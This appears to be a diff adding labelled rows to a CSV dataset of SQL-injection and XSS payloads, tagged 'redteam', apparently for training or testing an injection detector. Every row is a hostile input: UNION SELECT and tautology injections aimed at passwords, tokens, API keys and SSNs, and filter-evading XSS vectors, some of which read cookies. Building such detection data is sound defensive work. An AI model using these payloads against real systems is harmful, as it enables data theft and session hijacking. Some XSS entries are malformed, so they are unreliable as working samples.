+1 or exists(select pwd from clients),1,sqli,redteam,claude
+<body ontoggle=&#117;lert(1)>,1,xss,redteam,claude
+6 OR 1=8;,1,sqli,redteam,claude
+' oR apikey IS Not nULL#,1,sqli,redteam,claude
+9 oR 9=1-- -,1,sqli,redteam,claude
+7 oR pwd LIkE '%'-- x,1,sqli,redteam,claude
+give all clients where 9 is 3 or true,1,sqli,redteam,claude
+"3%20UniON%20SELEcT email,token,apikey FrOM members#",1,sqli,redteam,claude
+1 or exists(select token from orders),1,sqli,redteam,claude
+<math onanimationstart=&#101;lert(1)>,1,xss,redteam,claude
+char(50) Or char(49)=char(51),1,sqli,redteam,claude
+x' or 'z'='z-- -,1,sqli,redteam,claude
+please render <form onerror=alert(document.domain)> here,1,xss,redteam,claude
+9 or role LIke '%'-- x,1,sqli,redteam,claude
+"""><svg onstart=confirm(1)>",1,xss,redteam,claude
+8 oR 8=3-- ,1,sqli,redteam,claude
+please render <details onpageshow=alert(document.cookie)> here,1,xss,redteam,claude
+"8/**/UnIon sElEcT ssn,secret FROM users/*c*/",1,sqli,redteam,claude
+<IMG oNErroR=top['al'+'ert'](1)>,1,xss,redteam,claude
+9 OR 9=1-- -,1,sqli,redteam,claude
+1 oR 5=2-- ,1,sqli,redteam,claude
+<iFrAmE oNerROr=top['al'+'ert'](1)>,1,xss,redteam,claude
+9 or 3=8/*c*/,1,sqli,redteam,claude
+<img%20src=x%20onerror=alert(document.cookie)>,1,xss,redteam,claude
+1 or exists(select token from members);,1,sqli,redteam,claude
+9 and (select count(*) from staff)>0-- x,1,sqli,redteam,claude
+"""><math onerror=top['al'+'ert'](1)>",1,xss,redteam,claude
+7 aND (select count(*) from orders)>1#,1,sqli,redteam,claude
+list every staff where 5 = 5 or true,1,sqli,redteam,claude
+please render <marquee onerror=alert(1)> here,1,xss,redteam,claude
+' OR uid iS noT NuLl;,1,sqli,redteam,claude
+<IMG oneRROR=top['al'+'ert'](1)>,1,xss,redteam,claude
+give all tokens where 2 = 7 or true,1,sqli,redteam,claude
+6 oR password lIkE '%',1,sqli,redteam,claude
+7 ANd (select count(*) from staff)>3#,1,sqli,redteam,claude
+<iframe onafterscriptexecute=self['al'+'ert']`1`>,1,xss,redteam,claude
+or exists(select uid from users)-- -,1,sqli,redteam,claude
+"""><xss onanimationstart=alert`1`>",1,xss,redteam,claude
+x' or 'y'='z%00,1,sqli,redteam,claude
+char(57) oR char(57)=char(50),1,sqli,redteam,claude
+"3	UniOn sElECt ssn,token,password FrOm staff-- -",1,sqli,redteam,claude
+please render <embed onafterscriptexecute=confirm(1)> here,1,xss,redteam,claude
+please render <audio onstart=confirm(1)> here,1,xss,redteam,claude
+' oR ssn is nOT null-- -,1,sqli,redteam,claude
+<iFrAmE ONErRoR=top['al'+'ert'](1)>,1,xss,redteam,claude
+char(54) or char(54)=char(52),1,sqli,redteam,claude
+0 or 8=9-- ,1,sqli,redteam,claude
+"""><audio ontoggle=top['al'+'ert'](1)>",1,xss,redteam,claude
+x' Or 'a'='a-- -,1,sqli,redteam,claude
+"""><embed onpointerrawupdate=confirm(1)>",1,xss,redteam,claude
+4 AnD (select count(*) from staff)>3-- ,1,sqli,redteam,claude
+' or uid Is NOt nuLL/*c*/,1,sqli,redteam,claude
+8 aNd (select count(*) from members)>2-- -,1,sqli,redteam,claude
+8 And (select count(*) from orders)>0/*c*/,1,sqli,redteam,claude
+6 and (select count(*) from accounts)>2-- -,1,sqli,redteam,claude
+list every clients where 9 equals 3 or true,1,sqli,redteam,claude
+return all sessions where 6 = 3 or true,1,sqli,redteam,claude
+"""><audio onerror=print()>",1,xss,redteam,claude
+3 Or pwd lIKe '%'#,1,sqli,redteam,claude
+<SvG onErrOR=alert`1`>,1,xss,redteam,claude
+please render <isindex ontoggle=alert(document.domain)> here,1,xss,redteam,claude
+' or token IS nOT NULl,1,sqli,redteam,claude
+<img	src=xonerror=print()>,1,xss,redteam,claude
+<iframeonerror=alert(document.cookie)>,1,xss,redteam,claude
+char(48) Or char(49)=char(49),1,sqli,redteam,claude
+2 or password lIKe '%';,1,sqli,redteam,claude
+char(49) oR char(56)=char(54),1,sqli,redteam,claude
+3 AND (select count(*) from people)>0;,1,sqli,redteam,claude
+<math onpointerrawupdate=&#122;lert(1)>,1,xss,redteam,claude
+6%20uNIOn/**/seLEct secret fRoM orders/*c*/,1,sqli,redteam,claude
+"1 uNiON/**/seLeCt role,ssn,uid frOM staff-- -",1,sqli,redteam,claude
+Or exists(select password from accounts)%00,1,sqli,redteam,claude
+8 anD (select count(*) from people)>3#,1,sqli,redteam,claude
+please render <isindex onpageshow=top['al'+'ert'](1)> here,1,xss,redteam,claude
+please render <embed onerror=print()> here,1,xss,redteam,claude
+char(51) oR char(54)=char(51),1,sqli,redteam,claude
+"<img%20src=x
+onerror=alert`1`>",1,xss,redteam,claude
+fetch all people where 5 is 5 or true,1,sqli,redteam,claude
+"""><math onload=print()>",1,xss,redteam,claude
+"2	UnioN SELEcT uid,apikey FROM people;",1,sqli,redteam,claude
+1 OR exists(select apikey from staff)#,1,sqli,redteam,claude
+"<img
+src=xonerror=print()>",1,xss,redteam,claude
+"<iframe
+onanimationstart=alert(document.domain)>",1,xss,redteam,claude
+<svg/ontoggle=print()>,1,xss,redteam,claude
+<SvG OnERroR=top['al'+'ert'](1)>,1,xss,redteam,claude
+<IMG ONerROR=alert(document.domain)>,1,xss,redteam,claude
+x' oR 'b'='b;,1,sqli,redteam,claude
+8 or hash lIKe '%'-- ,1,sqli,redteam,claude
+"""><audio onfocus=alert(document.cookie)>",1,xss,redteam,claude
+user' or 'z'='z-- x,1,sqli,redteam,claude
+6 or 4=7/*c*/,1,sqli,redteam,claude
+<img/src=x	onerror=alert(document.cookie)>,1,xss,redteam,claude
+x' or 'b'='y;,1,sqli,redteam,claude
+7 oR 3=4-- ,1,sqli,redteam,claude
+list every orders where 7 = 6 or true,1,sqli,redteam,claude
+<isindexonfocus=alert(document.domain)>,1,xss,redteam,claude
+' Or apikey IS NOT Null,1,sqli,redteam,claude
+list all staff where 4 = 8 or true,1,sqli,redteam,claude
+1 Or exists(select hash from auth)-- ,1,sqli,redteam,claude
+show me all members where 7 equals 1 or true,1,sqli,redteam,claude
+' OR uid is nOT NULL,1,sqli,redteam,claude
+char(51) Or char(55)=char(51),1,sqli,redteam,claude
+"""><math onerror=confirm(1)>",1,xss,redteam,claude
+1 anD (select count(*) from staff)>1;,1,sqli,redteam,claude
+<embed onstart=&#100;lert(1)>,1,xss,redteam,claude
+<embed ontoggle=&#110;lert(1)>,1,xss,redteam,claude
+4 AnD (select count(*) from staff)>1-- x,1,sqli,redteam,claude
+<iFrAmE oneRROr=alert`1`>,1,xss,redteam,claude
+0 oR 6=1%00,1,sqli,redteam,claude
+8	UNiON sELeCt hash fROM members-- -,1,sqli,redteam,claude
+2 Or 4=9,1,sqli,redteam,claude
+"6%20unIOn%20seLECT hash,uid,pwd FroM tokens-- ",1,sqli,redteam,claude
+<style onload=&#103;lert(1)>,1,xss,redteam,claude
+6 Or role Like '%'/*c*/,1,sqli,redteam,claude
+<img%20src=x/onerror=confirm(1)>,1,xss,redteam,claude
+give every auth where 8 = 8 or true,1,sqli,redteam,claude
+9 oR 3=7-- x,1,sqli,redteam,claude
+<details ontoggle=&#110;lert(1)>,1,xss,redteam,claude
+admin' or 'b'='a/*c*/,1,sqli,redteam,claude
+1' oR 'b'='b;,1,sqli,redteam,claude
+<style onerror=top['al'+'ert']`1`>,1,xss,redteam,claude
+' or role Is not NulL,1,sqli,redteam,claude
+<IMG onErROr=alert(document.cookie)>,1,xss,redteam,claude
+1 OR hash lIkE '%';,1,sqli,redteam,claude
+"7 unIoN/**/sELeCT hash,password frOm staff-- -",1,sqli,redteam,claude
+1 or password LIke '%'-- x,1,sqli,redteam,claude
+1 OR hash LikE '%'/*c*/,1,sqli,redteam,claude
+1' oR 'b'='z-- x,1,sqli,redteam,claude
+' OR uid Is noT nUlL-- -,1,sqli,redteam,claude
+' or role is not nUll-- ,1,sqli,redteam,claude
+<img/src=x%20onerror=alert`1`>,1,xss,redteam,claude
+char(49) Or char(48)=char(50),1,sqli,redteam,claude
+give every people where 8 equals 3 or true,1,sqli,redteam,claude
+1 Or exists(select uid from staff),1,sqli,redteam,claude
+please render <svg onpointerrawupdate=alert(document.domain)> here,1,xss,redteam,claude
+7 oR 5=7;,1,sqli,redteam,claude
+7 oR pwd LIke '%',1,sqli,redteam,claude
+"""><svg onpointerrawupdate=alert(document.cookie)>",1,xss,redteam,claude
+"<img%20src=x
+onerror=confirm(1)>",1,xss,redteam,claude
+' or token IS noT NuLl#,1,sqli,redteam,claude
+<IMG ONeRrOr=alert`1`>,1,xss,redteam,claude
+char(53) oR char(48)=char(52),1,sqli,redteam,claude
+<isindex onpageshow=&#119;lert(1)>,1,xss,redteam,claude
+please render <style onfocus=alert(document.domain)> here,1,xss,redteam,claude
+' Or apikey iS NoT nUlL-- -,1,sqli,redteam,claude
+<IMG ONErroR=alert(1)>,1,xss,redteam,claude
+5/**/Union%20sElECt email frOm clients#,1,sqli,redteam,claude
+<img	src=xonerror=top['al'+'ert'](1)>,1,xss,redteam,claude
+<svg onload=top['al'+'ert']`1`>,1,xss,redteam,claude
+please render <video onpointerrawupdate=alert(document.domain)> here,1,xss,redteam,claude
+<video/onerror=alert`1`>,1,xss,redteam,claude
+<IMG OneRROR=confirm(1)>,1,xss,redteam,claude
+5 oR 5=1-- -,1,sqli,redteam,claude
+"3	uniON%20SeLECt password,email frOM people-- x",1,sqli,redteam,claude
+please render <math onstart=alert(document.cookie)> here,1,xss,redteam,claude
+"""><details onpageshow=alert(document.domain)>",1,xss,redteam,claude
+6 ANd (select count(*) from orders)>2;,1,sqli,redteam,claude
+0' or 'x'='x-- -,1,sqli,redteam,claude
+4%20uniON/**/selECt apikey fRoM people-- x,1,sqli,redteam,claude
+' oR hash IS NOT Null;,1,sqli,redteam,claude
+"9%20UNiOn SELECT uid,hash,apikey fROm people",1,sqli,redteam,claude
+' oR hash is Not nULl-- ,1,sqli,redteam,claude
+"5	uNion%20SElEcT pwd,token,hash fROm users",1,sqli,redteam,claude
+please render <body onload=confirm(1)> here,1,xss,redteam,claude
+char(56) Or char(48)=char(54),1,sqli,redteam,claude
+<iframe onpointerrawupdate=alert(document.domain)>,1,xss,redteam,claude
+' OR ssn iS not nulL-- x,1,sqli,redteam,claude
+1 and (select count(*) from accounts)>2-- x,1,sqli,redteam,claude
+"""><isindex onanimationstart=alert(1)>",1,xss,redteam,claude
+user' Or 'x'='z-- ,1,sqli,redteam,claude
+char(50) OR char(48)=char(57),1,sqli,redteam,claude
+' oR apikey IS NOT NULl-- -,1,sqli,redteam,claude
+"""><body onpointerrawupdate=alert`1`>",1,xss,redteam,claude
+8 oR 9=2/*c*/,1,sqli,redteam,claude
+9 aND (select count(*) from tokens)>3/*c*/,1,sqli,redteam,claude
+1' Or 'y'='y;,1,sqli,redteam,claude
+x' Or 'x'='b,1,sqli,redteam,claude
+<form onstart=&#98;lert(1)>,1,xss,redteam,claude
+5 Or pwd Like '%'#,1,sqli,redteam,claude
+<svg/onanimationstart=alert(document.domain)>,1,xss,redteam,claude
+<svg/onpageshow=alert(1)>,1,xss,redteam,claude
+6 Or 6=1#,1,sqli,redteam,claude
+' oR pwd IS not NulL/*c*/,1,sqli,redteam,claude
+<imgsrc=x%20onerror=confirm(1)>,1,xss,redteam,claude
+x' or 'y'='a,1,sqli,redteam,claude
+1 oR exists(select pwd from sessions)%00,1,sqli,redteam,claude
